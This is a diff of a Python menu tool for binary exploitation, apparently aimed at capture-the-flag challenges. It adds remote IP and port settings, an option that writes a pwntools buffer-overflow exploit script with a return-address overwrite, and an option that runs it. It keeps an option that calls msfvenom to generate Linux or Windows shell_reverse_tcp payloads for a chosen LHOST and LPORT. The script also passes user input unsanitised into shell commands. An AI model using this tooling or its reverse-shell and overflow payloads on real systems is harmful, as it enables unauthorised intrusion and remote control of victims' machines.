@@ -20,6 +20,7 @@ import r2pipe
 import sqlite3
 import pyfiglet
 import linecache
+import subprocess
 
 from termcolor import colored
 
@@ -309,7 +310,7 @@ def dispMenu():
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551', end=' ')
    if BITS[:7] != "unknown" and OFF[:1] != "0":
-      print(colored("RIP/EIP    ", colour2), end=' ')
+      print("RIP/EIP    ", end=' ')
       print(colored("*", colour2,attrs=['blink']), end=' ')
    else:
       print("RIP/EIP      ", end=' ')   
@@ -403,60 +404,70 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Set  ACCUMULATOR (11) Set MAIN ADDRESS (21) Read File Head (31) Pattern   Creater (41) HEX Editor   " + '\u2551' + " FILE INFORMATION AND DIAGNOSTICS " + (" ")*24 + '\u2551')
+   print('\u2551' + "(01) Set  ACCUMULATOR (11) Set MAIN ADDRESS (21) Read   Headers (31) Pattern   Creater (41) HEX Editor   " + '\u2551' + " REMOTE FILE INFORMATION " + (" ")*33 + '\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(02) Set BASE POINTER (12) Set CUS1 ADDRESS (22) Read   Objects (32) Program Interface (42) Ghidra       " + '\u2560' + ('\u2550')*58 + '\u2563')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(03) Set LOOP COUNTER (13) Set CUS2 ADDRESS (23) Read   Section (33) L-Trace Interface (43) ImmunityDeBug" + '\u2551' + " FILE NAME   ", end=' ')
+   print('\u2551' + "(03) Set LOOP COUNTER (13) Set CUS2 ADDRESS (23) Read   Section (33) L-Trace Interface (43) ImmunityDeBug" + '\u2551' + " FILE NAME      ", end=' ')
    if FIL[:7] == "unknown":
-      print(colored(FIL[:COL3-13],colour7), end=' ')   
+      print(colored(FIL[:COL3-16],colour7), end=' ')   
    else:
-      print(colored(FIL[:COL3-13],colour6), end=' ')
+      print(colored(FIL[:COL3-16],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(04) Set DATALOCATION (14) Select  FILENAME (24) Read   Headers (34) G.D.B.  Interface (44) NASM ShellCod" + '\u2551' + " FORMAT      ", end=' ')
+   print('\u2551' + "(04) Set DATALOCATION (14) Select  FILENAME (24) Read   Headers (34) G.D.B.  Interface (44) NASM    Shell" + '\u2551' + " FORMAT         ", end=' ')
    if COM[:7] != "unknown":
       print(colored(COM,colour6), end=' ')
    else:
       print(colored(COM,colour7), end=' ')  
    print("MODE   ", end=' ') 
    if MODE[:7] == "unknown":
-      print(colored(MODE[:7],colour7), end=' ')
+      print(colored(MODE[:COL1-5],colour7), end=' ')
    else:
-      print(colored(MODE[:7],colour6), end=' ') 
-   print((" ")*9+ '\u2551')
+      print(colored(MODE[:COL1-5],colour6), end=' ') 
+   print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(05) Set SOURCE INDEX (15) Switch File Mode (25) Read   Execute (35) Find SegmentFault (45) Gen ShellsCod" + '\u2551' + " ARCHITECTURE", end= ' ')
+   print('\u2551' + "(05) Set SOURCE INDEX (15) Switch File Mode (25) Read   Execute (35) Find SegmentFault (45) Gen ShellCode" + '\u2551' + " ARCHITECTURE   ", end= ' ')
    if ARC[:7] == "unknown":
       print(colored(ARC,colour7), end=' ')
    else:
       print(colored(ARC,colour6), end=' ')
    print("FLAVOUR", end=' ')
    print(colored(flavour[:5],colour6),end=' ' )
-   print((" ")*11 + '\u2551')
+   print((" ")*8 + '\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(06) Set DESTIN INDEX (16) Examine  Program (26) Read DeBugInfo (36) Set Buffer OFFSET (46) GenExploitCod" + '\u2551' + " BITS        ", end=' ')
+   print('\u2551' + "(06) Set DESTIN INDEX (16) Examine  Program (26) Read DeBugInfo (36) Set Buffer OFFSET (46) RESERVED     " + '\u2551' + " BITS           ", end=' ')
    if BITS[:1] != "u":
       print(colored(BITS,colour6), end=' ')
    else:
-      print(colored(BITS,colour7), end=' ')      
-   print((" ")*25 + '\u2551')  
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(07) Set STACKPOINTER (17) CheckSec Program (27) Read   Intamix (37) Dis-Assemble MAIN (47) RESERVED     " + '\u2551' + " INDIAN      ", end=' ')
+      print(colored(BITS,colour7), end=' ')   
+   print("INDIAN ", end=' ')       
    if IND[:7] == "unknown":
-      print(colored(IND,colour7), end=' ')
+      print(colored(IND[:COL1-5],colour7), end=' ')
    else:
-      print(colored(IND,colour6), end=' ')
-   print((" ")*25 + '\u2551')
+      print(colored(IND[:COL1-5],colour6), end=' ')  
+   print('\u2551')  
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(08) Set BASE POINTER (18) G.D.B. Functions (28) Read   Symbols (38) Dis-Assemble FUNC (48) RESERVED     " + '\u2551' + " LIBC VERSION", end=' ')
-   if LIBC[:1] == "u":
-      print(colored(LIBC[:COL2-2],colour7), end=' ')
+   print('\u2551' + "(07) Set STACKPOINTER (17) CheckSec Program (27) Read   Intamix (37) Dis-Assemble MAIN (47) Set IP & Port" + '\u2551'  " REMOTE ADDRESS ", end=' ')
+   if remAddr[:7] == "unknown":
+      print(colored(remAddr,colour7), end=' ')
    else:
-      print(colored(LIBC[:COL2-2],colour6), end=' ')
+      print(colored(remAddr,colour6), end=' ')
+   print("PORT   ", end=' ')
+   if remPort[:7] == "unknown":
+      print(colored(remPort[:13],colour7),end=' ' )
+   else:
+      print(colored(remPort[:13],colour6),end=' ' )   
+   print('\u2551')   
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(08) Set BASE POINTER (18) G.D.B. Functions (28) Read   Symbols (38) Dis-Assemble FUNC (48) Write Exploit" + '\u2551' + " LIBC VERSION   ", end=' ')
+   if LIBC[:7] == "unknown":
+      print(colored(LIBC[:COL2-5],colour7), end=' ')
+   else:
+      print(colored(LIBC[:COL2-5],colour6), end=' ')
    print('\u2551') 
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(09) Set INSP POINTER (19) Radar2 Functions (29) Read Stab Data (39) Dis-Assemble ADDR (49) RESERVED     " + '\u2551' + "                                                          " + '\u2551')
+   print('\u2551' + "(09) Set INSP POINTER (19) Radar2 Functions (29) Read Stab Data (39) Dis-Assemble ADDR (49) Run Exploit  " + '\u2551' + "                                                          " + '\u2551')
    print('\u2551' + "(10) Set STARTADDRESS (20) Find all Gadgets (30) Read HexFormat (40) RESERVED          (50) Exit         " + '\u2551' + "                                                          " + '\u2551')
    print('\u255A' + ('\u2550')*105 + '\u2569' +  ('\u2550')*58 + '\u255D') #colored("VALUE",colour5)
    return
@@ -545,6 +556,7 @@ print("[+] Populating system variables...")
 COL1 = 18
 COL2 = 45
 COL3 = 56
+LEN1 = 0
 
 FUNC = [" "*COL2]*maxDispl
 GADD = [" "*COL3]*maxDispl
@@ -561,6 +573,8 @@ RW = spacePadding("RWX      unknown", COL1)
 
 # NEW VARIABLES THAT NEED TO BE ADDED TO THE DATABASE
 
+remAddr = spacePadding("unknown", COL1)
+remPort = spacePadding("unknown", COL1)
 BITS = spacePadding("unknown", COL1)
 MODE = spacePadding("unknown", COL1)
 LIBC = spacePadding("unknown", COL2)
@@ -968,7 +982,7 @@ while True:
             BITS = spacePadding(BITS, COL1)         
          if "LSB" in binary:
             IND = "Little"
-            print(IND + " indian...")
+            print(IND + " indian format...")
             IND = spacePadding(IND, COL1)
          if "MSB" in binary:
             IND = "Big"
@@ -1196,7 +1210,12 @@ while True:
                if "vax" in data:
                   ARC = spacePadding("vax", COL1)
                if "elf" in data:
-                  COM = spacePadding("ELF", COL1)
+                  COM = spacePadding("ELF", COL1)                  
+         if SRT[:18] == "0x0000000000000000":
+            command("cat headers.tmp | grep start > start.tmp")
+            with open("start.tmp","r") as address:
+               SRT = address.readline().split(" ")[2]
+               SRT = spacePadding(SRT, COL1)
       prompt()   
    
 # ------------------------------------------------------------------------------------- 
@@ -1372,10 +1391,10 @@ while True:
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         length = input("[?] Please input length of pattern: ")
-         if length.isdigit():
+         LEN1 = input("[?] Please input LEN1 of pattern: ")
+         if LEN1.isdigit():
             print(colored("[*] Creating unique pattern...", colour3))          
-            command("msf-pattern_create -l " + length + " > pattern.tmp")
+            command("msf-pattern_create -l " + LEN1 + " > pattern.tmp")
             catsFile("pattern.tmp")
          else:
             print("[-] Invalid value...")
@@ -1446,7 +1465,7 @@ while True:
          print(colored("[*] Finding buffer offset...", colour3))
          offset = input("[?] Please enter segmentation fault value: ")
          if offset != "":
-            command("msf-pattern_offset -l " + length + " -q " + offset + " > offset.tmp")
+            command("msf-pattern_offset -l " + LEN1 + " -q " + offset + " > offset.tmp")
             catsFile("offset.tmp")
             OFF = linecache.getline("offset.tmp", 1).rstrip("\n").split(" ")[-1]
             OFF = spacePadding(OFF, COL1)
@@ -1595,11 +1614,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '44':
-      if FIL[:7].upper() == "UNKNOWN":
-         print("[-] Filename not specified...")
-      else:
-         print(colored("[*] Nasm shell initiated...", colour3))          
-         command("/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
+      print(colored("[*] Nasm shell initiated...\n", colour3))          
+      command("/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
@@ -1611,17 +1627,40 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '45':
-      if FIL[:7].upper() == "UNKNOWN":
-         print("[-] Filename not specified...")
+      localHost = input("[?] Please enter localhost value: ")
+      localPort = input("[?] Please enter localport value: ")
+      if COM[:3] == "ELF":
+         command("msfvenom -p linux/x" + ARC[:2] + "/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
       else:
-         localHost = input("[?] Please enter localhost value: ")
-         localPort = input("[?] Please enter localport value: ")
-         if COM[:3] == "ELF":
-            command("msfvenom -p linux/x" + ARC[:2] + "/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
-         else:
-            command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
-         catsFile("payload.tmp")
+         command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
+      catsFile("payload.tmp")
       prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : GOLDEN ELF
+# Details : Menu option selected - Blank.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '46':
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : GOLDEN ELF
+# Details : Menu option selected - Blank.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '47':
+      remAddr = input("[?] Please enter remote IP address : ")
+      remAddr = spacePadding(remAddr, COL1)
+      remPort = input("[?] Please enter remote port number: ")
+      remPort = spacePadding(remPort, COL1)
+      prompt()      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1631,7 +1670,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '46':
+   if selection == '48':
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
@@ -1658,7 +1697,7 @@ while True:
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'try:' >> " + localDir + "/exploit.py")
-         command("echo '   s = remote(\"10.10.10.10\", 1010)' >> " + localDir + "/exploit.py")
+         command("echo '   s = remote(\"" + remAddr.rstrip(" ") + "\", " + remPort.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'except:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
@@ -1666,9 +1705,9 @@ while True:
         # ADD OTHER REGISTER HERE!!
         
          command("echo 'start = " + SRT.rstrip(" ") + "' >> " + localDir + "/exploit.py")
-         command("echo 'main = " + MAIN.rstrip(" ") + "' >> " + localDir + "/exploit.py")
-         command("echo 'cus1 = " + CUS1.rstrip(" ") + "' >> " + localDir + "/exploit.py")
-         command("echo 'cus2 = " + CUS2.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'main  = " + MAIN.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'cus1  = " + CUS1.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'cus2  = " + CUS2.rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'buffers   = \"a\" * " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
          command("echo 'integer   = \"a\" * 4' >> " + localDir + "/exploit.py")
@@ -1677,22 +1716,23 @@ while True:
          else:
             command("echo 'pointer   = \"a\" * 4' >> "+ localDir + "/exploit.py")         
          command("echo 'padding   = \"a\" * 4' >> "+ localDir + "/exploit.py")  
-         command("echo 'overwrite = p64(cus1)' >> "+ localDir + "/exploit.py")  
-         command("echo 'term      = \"\ n\"' >> "+ localDir + "/exploit.py")
+         command("echo 'overwrite = p64(cus1)' >> "+ localDir + "/exploit.py")          
+         command("echo 'term      = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'payload = flat(buffers,overwrite,term)' >> " + localDir + "/exploit.py")
-         command("echo 'print(payload)' >> " + localDir + "/exploit.py")
+         command("echo '# print(payload)' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 's.recvuntil(\"Enter your name :\")' >> " + localDir + "/exploit.py")
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
-         command("echo 's.recvuntil(\"Congratulations!\ n\")'  >> " + localDir + "/exploit.py")
+         command("echo 's.recvuntil(\"Congratulations!\\\\n\")'  >> " + localDir + "/exploit.py")
          command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
          command("echo 'success(flag)' >> " + localDir + "/exploit.py")
-         command("echo 's.interactive()' >> " + localDir + "/exploit.py")
+         command("echo '# s.interactive()' >> " + localDir + "/exploit.py")
          command("echo 's.close()' >> " + localDir + "/exploit.py")
          print(colored("[*] Python exploit template sucessfully created...", colour3))
-         prompt()              
+      prompt()              
          
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -1701,18 +1741,14 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '48':
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : GOLDEN ELF
-# Details : Menu option selected - Blank.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '49':       
+   if selection == '49':     
+      if FIL[:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
+      else:  
+         os.chdir(localDir)
+         command("echo 'https://youtu.be/me_yl82pDqE' > flag.txt")  
+         os.system("python3 exploit.py")
+         os.chdir("..")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1725,7 +1761,7 @@ while True:
 
    if selection == '50':        
       saveParams()
-      command("rm *.tmp")      
+      command("rm *.tmp")    
       connection.close()
       print(colored("[*] Program sucessfully terminated...", colour3))
       exit(1)  
